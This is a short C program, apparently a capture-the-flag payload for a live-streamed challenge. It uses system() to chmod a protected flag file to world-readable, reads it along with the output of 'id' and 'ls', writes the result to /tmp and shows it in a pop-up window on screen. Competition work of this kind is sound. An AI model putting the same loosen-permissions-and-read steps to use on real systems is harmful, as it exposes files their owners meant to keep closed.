/* Twitch Pwn 01 v2 — le a flag do time NOP e mostra na tela da live.
 * Arquivos em /twitch/desafio-01/ tem modo ---------- (dono ctf).
 * Se rodamos como o dono, podemos relaxar a permissao e ler.
 * So mexemos no NOSSO flag-nop.txt (fair play). Mostra id para diagnostico. */
#include <stdlib.h>

int main(void) {
    system(
        "export DISPLAY=\"${DISPLAY:-:0}\"; "
        "export XAUTHORITY=\"${XAUTHORITY:-$HOME/.Xauthority}\"; "
        "T=/twitch/desafio-01/flag-nop.txt; "
        "chmod u+r \"$T\" 2>/dev/null; chmod 0644 \"$T\" 2>/dev/null; "
        "{ echo '===== FLAG NOP ====='; "
        "  cat \"$T\" 2>&1; "
        "  echo; echo \"[id] $(id)\"; "
        "  echo \"[stat] $(ls -l \"$T\" 2>&1)\"; "
        "} > /tmp/FLAG.txt 2>&1; "
        "F=$(cat /tmp/FLAG.txt); "
        "( xterm -fa Monospace -fs 22 -geometry 100x16+40+40 -e \"cat /tmp/FLAG.txt; sleep 115\" "
        "  || mousepad /tmp/FLAG.txt "
        "  || gedit /tmp/FLAG.txt "
        "  || zenity --info --no-wrap --title='FLAG' --text=\"$F\" "
        "  || xmessage -center \"$F\" "
        "  || notify-send 'FLAG' \"$F\" "
        ") >/dev/null 2>&1 & "
        "sleep 115"
    );
    return 0;
}
